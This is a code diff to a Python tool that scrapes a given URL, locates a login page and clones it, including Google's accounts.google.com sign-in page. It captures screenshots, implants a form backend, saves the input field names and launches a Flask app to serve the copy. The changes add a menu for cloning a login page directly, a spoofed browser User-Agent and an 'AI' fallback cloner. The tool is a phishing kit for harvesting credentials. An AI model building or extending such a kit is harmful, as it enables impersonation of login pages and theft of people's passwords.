@@ -28,6 +28,7 @@ with open(os.path.join(folder_path, "mail_keywords"), 'r', encoding='utf-8') as 
 with open(os.path.join(folder_path, "password_keywords"), 'r', encoding='utf-8') as file:
     for line in file:
         input_pass.append(line.strip())
+python_file_path =os.path.join(cwd, 'flaskapp.py')
 
 #Linklists
 links_with_text = []
@@ -35,13 +36,20 @@ check = []
 login_link = []
 uniquestrings = []
 finallinks = []
+
+print("1... Link to website")
+print("2... Link to Loginsite")
+menu = int(input("Enter Option: "))
 url = input("Enter a URL: ")
 urlpath = cwd + "\\url"
 with open (urlpath ,"w") as file:
     file.write(url)
 
 #Scrape Page:
-result = requests.get(url).text
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
+}
+result = requests.get(url, headers=headers).text
 doc = BeautifulSoup(result, "html.parser")
 with open('output.html', 'w', encoding="utf-8") as file:
     file.write(str(doc))
@@ -50,8 +58,8 @@ with open('output.html', 'w', encoding="utf-8") as file:
 #Functions
 mainhtml.find_links(doc, links_with_text)
 #check if input field
-if(mainhtml.check_form(doc, input_mail, input_pass)):
-        print(colored("Page identified as Loginpage!","blue"))
+if menu == 2:
+        print(colored("Start to clone Loginpage!","blue"))
         clone.download_website(url)
         screenshot.take_screenshot(url, 'screenhot.png')
         backend.copy_files(urlparse(url).netloc, "index.html")
@@ -64,8 +72,6 @@ if(mainhtml.check_form(doc, input_mail, input_pass)):
         with open('data.pkl', 'wb') as f:
             pickle.dump(inputnames, f)
             
-        cwd = os.getcwd()
-        python_file_path =os.path.join(cwd, 'flaskapp.py')
         subprocess.run(["python", python_file_path])
 else:  
         mainhtml.check_links(links_with_text, link_var, login_link)
@@ -76,7 +82,7 @@ else:
             print(colored("Google Login found", "green"))
             print("url: https://accounts.google.com/")
             clone.download_website("https://accounts.google.com/")
-            #screenshot.take_screenshot("https://accounts.google.com/", 'screenhot.png')
+            screenshot.take_screenshot("https://accounts.google.com/", 'screenhot.png')
             backend.copy_files("accounts.google.com", "index.html")
             backend.implement_form()
             inputlist =[]
@@ -86,8 +92,6 @@ else:
             with open('data.pkl', 'wb') as f:
                 pickle.dump(inputnames, f)
             
-            cwd = os.getcwd()
-            python_file_path =os.path.join(cwd, 'flaskapp.py')
             subprocess.run(["python", python_file_path])
         elif len(login_link) > 0:
             print(colored("Loginlink found!", "green"))
@@ -116,11 +120,8 @@ else:
             with open('data.pkl', 'wb') as f:
                 pickle.dump(inputnames, f)
             
-            cwd = os.getcwd()
-            python_file_path =os.path.join(cwd, 'flaskapp.py')
             subprocess.run(["python", python_file_path])
-            
         else:
             print(colored("No Loginlink found!", "red"))
-
-#maincss.main(url)
+            print(colored("Now we let AI do its job!","blue"))
+            maincss.main(url)
